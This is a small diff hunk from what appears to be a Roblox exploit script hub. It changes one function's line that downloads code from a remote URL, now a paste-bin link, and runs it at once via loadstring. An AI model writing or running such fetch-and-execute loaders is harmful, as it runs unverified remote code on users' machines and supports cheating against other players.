@@ -26,7 +26,7 @@ local function firstScript()
 end
 
 local function secondScript()
-    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjgxN2EyNjcyLTZhN2ItNDQ0MS05ZDc5LWE5NmRlMDZiY2JmOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/rcNysOctBR/0", true))()
 end
 
 local function solara()
